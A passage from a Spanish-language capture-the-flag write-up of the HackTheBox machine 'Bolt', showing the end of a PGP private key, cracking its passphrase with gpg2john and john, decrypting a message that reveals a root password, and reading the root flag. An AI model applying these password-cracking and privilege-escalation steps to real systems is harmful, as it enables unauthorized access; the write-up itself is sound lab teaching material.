zc5gVIg7esI2dnTkNnFWoFZ3+j8hzFmS6lJvJ0GN+Nrd/gAOkhU8P2KcDz74
7WQQR3/eQa0m6QhOQY2q/VMgfteMejlHFoZCbu0IMkqwsAINmiiAc7H1qL3F
U3vUZKav7ctbWDpJU/ZJ++Q/bbQxeFPPkM+tZEyAn/fHwwYEYDgbYQEIAJpY
HMNw6lcxAWuZPXYz7FEyVjilWObqMaAael9B/Z40fVH29l7ZsWVFHVf7obW5
zNJUpTZHjTQV+HP0J8vPL35IG+usXKDqOKvnzQhGXwpnEtgMDLFJc2jw0I6M
KeFfplknPCV6uBlznf5q6KIm7YhHbbyuKczHb8BgspBaroMkQy5LHNYXw2FP
rOUeNkzYjHVuzsGAKZZzo4BMTh/H9ZV1ZKm7KuaeeE2x3vtEnZXx+aSX+Bn8
Ko+nUJZEn9wzHhJwcsRGV94pnihqwlJsCzeDRzHlLORF7i57n7rfWkzIW8P7
XrU7VF0xxZP83OxIWQ0dXd5pA1fN3LRFIegbhJcAEQEAAf4JAwizGF9kkXhP
leD/IYg69kTvFfuw7JHkqkQF3cBf3zoSykZzrWNW6Kx2CxFowDd/a3yB4moU
KP9sBvplPPBrSAQmqukQoH1iGmqWhGAckSS/WpaPSEOG3K5lcpt5EneFC64f
a6yNKT1Z649ihWOv+vpOEftJVjOvruyblhl5QMNUPnvGADHdjZ9SRmo+su67
JAKMm0cf1opW9x+CMMbZpK9m3QMyXtKyEkYP5w3EDMYdM83vExb0DvbUEVFH
kERD10SVfII2e43HFgU+wXwYR6cDSNaNFdwbybXQ0quQuUQtUwOH7t/Kz99+
Ja9e91nDa3oLabiqWqKnGPg+ky0oEbTKDQZ7Uy66tugaH3H7tEUXUbizA6cT
Gh4htPq0vh6EJGCPtnyntBdSryYPuwuLI5WrOKT+0eUWkMA5NzJwHbJMVAlB
GquB8QmrJA2QST4v+/xnMLFpKWtPVifHxV4zgaUF1CAQ67OpfK/YSW+nqong
cVwHHy2W6hVdr1U+fXq9XsGkPwoIJiRUC5DnCg1bYJobSJUxqXvRm+3Z1wXO
n0LJKVoiPuZr/C0gDkek/i+p864FeN6oHNxLVLffrhr77f2aMQ4hnSsJYzuz
4sOO1YdK7/88KWj2QwlgDoRhj26sqD8GA/PtvN0lvInYT93YRqa2e9o7gInT
4JoYntujlyG2oZPLZ7tafbSEK4WRHx3YQswkZeEyLAnSP6R2Lo2jptleIV8h
J6V/kusDdyek7yhT1dXVkZZQSeCUUcQXO4ocMQDcj6kDLW58tV/WQKJ3duRt
1VrD5poP49+OynR55rXtzi7skOM+0o2tcqy3JppM3egvYvXlpzXggC5b1NvS
UCUqIkrGQRr7VTk/jwkbFt1zuWp5s8zEGV7aXbNI4cSKDsowGuTFb7cBCDGU
Nsw+14+EGQp5TrvCwHYEGAEIAAkFAmA4G2ECGwwAIQkQHCdBo9w7Sr0WIQTf
QmvHpKivWOUO2g4cJ0Gj3DtKvf4dB/9CGuPrOfIaQtuP25S/RLVDl8XHvzPm
oRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg
6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/
Ic3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8
11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm
YZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0
PSwYYWlAywj5
=cqxZ
-----END PGP PRIVATE KEY BLOCK-----
</code></pre></div><p>Ahora, podemos informarnos sobre PGP, por ejemplo en <a href="https://es.wikipedia.org/wiki/Pretty_Good_Privacy">Wikipedia</a>. Las claves privadas se suelen proteger con una <em>passphrase</em>. Afortunadamente, existe una herramienta llamada <code>gpg2john</code> que extrae un <em>hash</em> de la clave privada PGP para poder romperlo con <code>john</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gpg2john</span> eddie.pgp | <span class="code-dark-green">tee</span> eddie.hash.pgp

File eddie.pgp
Eddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*b81f0847e01fb836c8cc7c8a2af31f19*16777216*34af9ef3956d5ad8:::Eddie Johnson &lt;eddie@bolt.htb&gt;::eddie.pgp  

<span class="code-cyan">$</span> <span class="code-dark-green">john</span> --wordlist=$WORDLISTS/rockyou.txt eddie.hash.pgp
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 16777216 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
<span class="code-dark-yellow">merrychristmas</span>   (<span class="code-dark-yellow">Eddie Johnson</span>)
1g 0:00:05:02 DONE 0.003307g/s 141.7p/s 141.7c/s 141.7C/s mike04..megan5
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</code></pre></div><h3 id="descifrando-un-mensaje-pgp">Descifrando un mensaje PGP</h3><p>Ahora que tenemos la <em>passphrase</em> (<code>merrychristmas</code>), podemos descifrar el mensaje encontrado anteriormente en una de las bases de datos de MySQL utilizando la clave privada PGP del usuario <code>eddie</code>. Este paso se puede realizar con una herramienta <em>online</em> como <a href="https://pgptool.org/">PGP tool</a>:</p><p><img src="/images/HTB/Bolt/Bolt-pgp-decrypt.png" alt="PGP tool"></p><p>Como se ve en la captura anterior, el mensaje encriptado se descifra como <code>{"password":"Z(2rmxsNW(Z?3=p/9s","description":""}</code>. Esta contraseña permite acceder a la máquina como usuario <code>root</code> y obtener la <em>flag</em> <code>root.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">eddie@bolt</span>:<span class="code-blue">~</span>$ su root
Password:
root@bolt:/home/eddie# cat /root/root.txt  
0efcfd934e37c153513612d761fe564d
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#inspeccionando-la-imagen-de-docker">Inspeccionando la imagen de Docker</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#accediendo-a-bolthtb-como-admin">Accediendo a <code>bolt.htb</code> como <code>admin</code></a></li><li><a href="#profundizando-aún-más-en-la-imagen-de-docker">Profundizando aún más en la imagen de Docker</a></li><li><a href="#encontrando-un-ssti">Encontrando un SSTI</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#movimiento-lateral-al-usuario-eddie">Movimiento lateral al usuario <code>eddie</code></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#buscando-una-clave-privada-pgp">Buscando una clave privada PGP</a></li><li><a href="#descifrando-un-mensaje-pgp">Descifrando un mensaje PGP</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>